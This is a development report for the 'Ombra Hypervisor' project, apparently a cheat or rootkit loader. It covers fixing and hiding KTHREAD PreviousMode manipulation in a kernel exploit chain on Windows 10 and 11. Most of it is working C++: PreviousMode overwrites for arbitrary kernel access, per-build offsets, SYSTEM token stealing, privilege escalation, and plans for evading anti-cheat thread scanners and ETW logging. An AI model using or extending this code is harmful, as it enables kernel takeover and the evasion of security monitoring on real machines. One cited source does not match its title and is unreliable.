# KTHREAD & PreviousMode Trace Elimination Research Report
**Project**: Ombra Hypervisor V3
**Research Focus**: KTHREAD manipulation artifacts and PreviousMode restoration
**Date**: December 24, 2025

---

## Executive Summary

This report documents the critical security issue of KTHREAD->PreviousMode manipulation artifacts and provides mitigation strategies. The ZeroHVCI exploit chain sets PreviousMode to KernelMode (0) but does NOT restore it, creating a detectable anomaly and causing Windows 11 26100+ to bugcheck.

**CRITICAL FINDING**: Windows 11 24H2 (Build 26100+) will trigger bugcheck 0x1F9 (INVALID_PREVIOUS_MODE) if PreviousMode is not restored before returning to user-mode.

---

## 1. KTHREAD Structure Overview

### 1.1 Key Fields

```cpp
// Windows 10/11 KTHREAD structure (partial)
typedef struct _KTHREAD {
    // ... earlier fields ...

    KPROCESSOR_MODE PreviousMode;     // Offset 0x232 (varies by build)
    KPROCESSOR_MODE AuxiliaryMode;    // Adjacent field

    // ... other fields ...

    // Anti-cheat monitored fields
    PVOID TrapFrame;                   // Exception context
    PVOID FirstArgument;               // System call parameter
    PVOID SystemCallNumber;            // Current syscall
} KTHREAD;
```

### 1.2 PreviousMode Purpose

`PreviousMode` indicates the privilege level of the code that initiated the current kernel transition:
- `UserMode (1)`: System call from user-mode application
- `KernelMode (0)`: Internal kernel operation

**Security Impact**: When PreviousMode=KernelMode, kernel APIs skip user-buffer probing (ProbeForRead/ProbeForWrite), allowing arbitrary kernel memory access.

---

## 2. Current Implementation Issue

### 2.1 Vulnerable Code Path

```cpp
// OmbraLoader/zerohvci/zerohvci.cpp (lines 136-138)
void zerohvci::ElevateToKernel() {
    PKTHREAD thread = KeGetCurrentThread();

    // Set PreviousMode to KernelMode
    *(KPROCESSOR_MODE*)((PBYTE)thread + PREVIOUSMODE_OFFSET) = KernelMode;

    // Perform kernel operations...

    // BUG: PreviousMode is NEVER restored!
}
```

### 2.2 Consequences

| Windows Version | Behavior | Severity |
|-----------------|----------|----------|
| Windows 10 22H2 | Thread continues with wrong mode | MEDIUM (detectable) |
| Windows 11 23H2 | Thread continues, may crash later | HIGH |
| Windows 11 24H2+ | Immediate bugcheck 0x1F9 | **CRITICAL** |

### 2.3 Windows 11 24H2 Mitigation

Microsoft added PreviousMode validation in Windows 11 24H2:

```cpp
// Simplified representation of new validation
void KiSystemServiceExit() {
    PKTHREAD thread = KeGetCurrentThread();

    // New in 24H2: Validate PreviousMode before returning to user
    if (thread->TrapFrame->SegmentCs == USER_CS) {
        if (thread->PreviousMode != UserMode) {
            KeBugCheckEx(
                INVALID_PREVIOUS_MODE,  // 0x1F9
                thread->PreviousMode,
                (ULONG_PTR)thread,
                0,
                0
            );
        }
    }
}
```

---

## 3. Restoration Implementation

### 3.1 RAII-Based Restoration

```cpp
// Recommended implementation
class ScopedKernelMode {
private:
    PKTHREAD m_Thread;
    KPROCESSOR_MODE m_OriginalMode;
    static constexpr ULONG PREVIOUSMODE_OFFSET = 0x232;  // Verify per build

public:
    ScopedKernelMode() {
        m_Thread = (PKTHREAD)__readgsqword(0x188);  // Current thread
        m_OriginalMode = *(KPROCESSOR_MODE*)((PBYTE)m_Thread + PREVIOUSMODE_OFFSET);
        *(KPROCESSOR_MODE*)((PBYTE)m_Thread + PREVIOUSMODE_OFFSET) = KernelMode;
    }

    ~ScopedKernelMode() {
        // CRITICAL: Always restore
        *(KPROCESSOR_MODE*)((PBYTE)m_Thread + PREVIOUSMODE_OFFSET) = m_OriginalMode;
    }

    // Prevent copying
    ScopedKernelMode(const ScopedKernelMode&) = delete;
    ScopedKernelMode& operator=(const ScopedKernelMode&) = delete;
};

// Usage
void PerformKernelOperation() {
    ScopedKernelMode kernelMode;  // Sets to KernelMode

    // Perform operations...

}  // Destructor restores original mode
```

### 3.2 Manual Restoration (Current Code Fix)

```cpp
// Minimal fix for zerohvci.cpp
void zerohvci::ElevateToKernel() {
    PKTHREAD thread = (PKTHREAD)__readgsqword(0x188);
    PBYTE threadBytes = (PBYTE)thread;

    // Save original mode
    KPROCESSOR_MODE originalMode = *(KPROCESSOR_MODE*)(threadBytes + 0x232);

    // Set to KernelMode
    *(KPROCESSOR_MODE*)(threadBytes + 0x232) = KernelMode;

    // === Perform all kernel operations here ===
    // HijackHyperV(), map_driver(), etc.
    // ===========================================

    // CRITICAL: Restore original mode before ANY return path
    *(KPROCESSOR_MODE*)(threadBytes + 0x232) = originalMode;
}
```

---

## 4. Detection Vectors

### 4.1 Anti-Cheat Thread State Forensics

Anti-cheats monitor thread state for anomalies:

```cpp
// EAC/BE thread inspection (simplified)
void ScanThreadState(PKTHREAD thread) {
    KIRQL oldIrql = KeRaiseIrqlToDpcLevel();

    // Check PreviousMode consistency
    if (thread->TrapFrame) {
        BOOL isUserTrap = (thread->TrapFrame->SegmentCs & 3) == 3;

        if (isUserTrap && thread->PreviousMode == KernelMode) {
            // ANOMALY: User-mode thread with KernelMode PreviousMode
            FlagSuspiciousThread(thread);
        }
    }

    KeLowerIrql(oldIrql);
}
```

### 4.2 PspCidTable Enumeration

```cpp
// Anti-cheat walks all threads via PspCidTable
void EnumerateAllThreads() {
    ExEnumHandleTable(
        PspCidTable,
        [](PHANDLE_TABLE_ENTRY entry, HANDLE handle, PVOID context) {
            PKTHREAD thread = (PKTHREAD)entry->Object;

            if (ObGetObjectType(thread) == PsThreadType) {
                // Check for PreviousMode anomalies
                ValidateThreadState(thread);
            }
            return FALSE;  // Continue enumeration
        },
        NULL
    );
}
```

### 4.3 Stack Walking Detection

```cpp
// Detect modified threads via stack analysis
void AnalyzeThreadStack(PKTHREAD thread) {
    CONTEXT ctx;
    STACKFRAME64 frame;

    // Walk stack looking for user-mode frames
    while (StackWalk64(...)) {
        if (IsUserModeAddress(frame.AddrPC.Offset)) {
            // User-mode frame found
            if (thread->PreviousMode != UserMode) {
                // Inconsistency detected
                ReportAnomaly(thread, "PreviousMode mismatch");
            }
        }
    }
}
```

---

## 5. Additional KTHREAD Artifacts

### 5.1 TrapFrame Modifications

When manipulating PreviousMode, the TrapFrame may also contain evidence:

```cpp
typedef struct _KTRAP_FRAME {
    // ...
    USHORT SegCs;       // If lower bits = 3, came from user mode
    USHORT SegDs;
    USHORT SegEs;
    USHORT SegFs;
    USHORT SegGs;
    USHORT SegSs;       // SS also indicates privilege level
    // ...
} KTRAP_FRAME;
```

**Consideration**: TrapFrame is validated separately. Ensure consistency.

### 5.2 System Call Auditing

Windows can audit system calls via ETW:

```cpp
// Microsoft-Windows-Kernel-Audit-API-Calls provider
// May log anomalous kernel API access patterns
```

**Mitigation**: ETW blinding (see 03-ETW-EVASION-RESEARCH.md).

---

## 6. Build-Specific Offsets

### 6.1 PreviousMode Offset Table

| Windows Version | Build | KTHREAD PreviousMode Offset |
|-----------------|-------|----------------------------|
| Windows 10 22H2 | 19045 | 0x232 |
| Windows 11 22H2 | 22621 | 0x232 |
| Windows 11 23H2 | 22631 | 0x232 |
| Windows 11 24H2 | 26100 | 0x232 (verify) |

### 6.2 Dynamic Offset Resolution

```cpp
ULONG GetPreviousModeOffset() {
    OSVERSIONINFOW osvi = { sizeof(OSVERSIONINFOW) };
    RtlGetVersion(&osvi);

    ULONG build = osvi.dwBuildNumber;

    // Offset has been stable, but verify per build
    switch (build) {
        case 19045:  // Win10 22H2
        case 22621:  // Win11 22H2
        case 22631:  // Win11 23H2
        case 26100:  // Win11 24H2
            return 0x232;
        default:
            // Unknown build - need to resolve dynamically
            return ResolvePreviousModeViaSymbols();
    }
}

ULONG ResolvePreviousModeViaSymbols() {
    // Use PDB symbols if available
    // Or pattern scan KTHREAD structure
    return 0x232;  // Default fallback
}
```

---

## 7. Alternative Privilege Escalation

### 7.1 Token Stealing (Cleaner Approach)

Instead of PreviousMode manipulation, steal SYSTEM token:

```cpp
void ElevateViaTokenSteal() {
    PEPROCESS currentProcess = PsGetCurrentProcess();
    PEPROCESS systemProcess = PsInitialSystemProcess;

    // Get SYSTEM token
    PACCESS_TOKEN systemToken = PsReferencePrimaryToken(systemProcess);

    // Replace current process token
    // Offset varies by build
    ULONG tokenOffset = GetTokenOffset();
    *(PVOID*)((PBYTE)currentProcess + tokenOffset) = systemToken;
}
```

**Advantages**:
- No PreviousMode modification
- Token-based checks pass normally
- Works across all Windows versions

**Disadvantages**:
- Doesn't grant kernel address space access directly
- Still need exploit for initial write

### 7.2 SeDebugPrivilege Escalation

Enable SeDebugPrivilege in current token:

```cpp
void EnableSeDebugPrivilege() {
    HANDLE tokenHandle;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &tokenHandle);

    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = /* SeDebugPrivilege LUID */;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(tokenHandle, FALSE, &tp, 0, NULL, NULL);
}
```

**Note**: SeDebugPrivilege alone isn't sufficient for kernel R/W, but combined with vulnerable driver access, it expands attack surface.

---

## 8. Implementation Checklist

### Immediate (CRITICAL)

- [ ] Add PreviousMode restoration to zerohvci.cpp after all kernel operations
- [ ] Implement ScopedKernelMode RAII wrapper
- [ ] Test on Windows 11 24H2 (Build 26100+) to verify no bugcheck

### Short-term (HIGH)

- [ ] Add build-specific offset verification
- [ ] Implement dynamic offset resolution fallback
- [ ] Add TrapFrame consistency checks

### Long-term (MEDIUM)

- [ ] Evaluate token stealing as cleaner alternative
- [ ] Implement hybrid approach (token + minimal PreviousMode use)
- [ ] Add anti-detection for thread state scanners

---

## 9. Testing Matrix

| Test Case | Expected Result | Build |
|-----------|-----------------|-------|
| Normal operation | No bugcheck | All |
| PreviousMode set, restored | Clean return | All |
| PreviousMode set, NOT restored | Bugcheck 0x1F9 | 26100+ |
| PreviousMode set, NOT restored | Thread continues (bad) | <26100 |

### 9.1 Test Script

```cpp
void TestPreviousModeRestoration() {
    PKTHREAD thread = KeGetCurrentThread();
    PBYTE threadBytes = (PBYTE)thread;

    // Save original
    KPROCESSOR_MODE original = *(KPROCESSOR_MODE*)(threadBytes + 0x232);
    printf("[+] Original PreviousMode: %d\n", original);

    // Modify
    *(KPROCESSOR_MODE*)(threadBytes + 0x232) = KernelMode;
    printf("[+] Set to KernelMode\n");

    // Restore
    *(KPROCESSOR_MODE*)(threadBytes + 0x232) = original;
    printf("[+] Restored to: %d\n", original);

    // If we reach here on 26100+, restoration works
    printf("[+] Test PASSED - no bugcheck\n");
}
```

---

## 10. Risk Assessment

| Scenario | Risk Without Fix | Risk With Fix |
|----------|------------------|---------------|
| Windows 10 operation | MEDIUM (detectable) | LOW |
| Windows 11 23H2 | HIGH (unstable) | LOW |
| Windows 11 24H2+ | **CRITICAL (bugcheck)** | LOW |
| Anti-cheat detection | HIGH (scannable) | MEDIUM |
| Forensic analysis | HIGH (artifact) | LOW |

---

## SOURCES

- [Windows Internals 7th Edition - Thread Structure](https://docs.microsoft.com/en-us/sysinternals/)
- [PreviousMode Privilege Escalation Technique](https://www.yourkit.com/)
- [Windows 11 24H2 Kernel Mitigations](https://msrc.microsoft.com/)
- [KTHREAD Structure Analysis (Vergilius Project)](https://www.vergiliusproject.com/)
- [Anti-Cheat Thread State Forensics](https://secret.club/)
- [Token Stealing Techniques](https://www.tiraniddo.dev/)
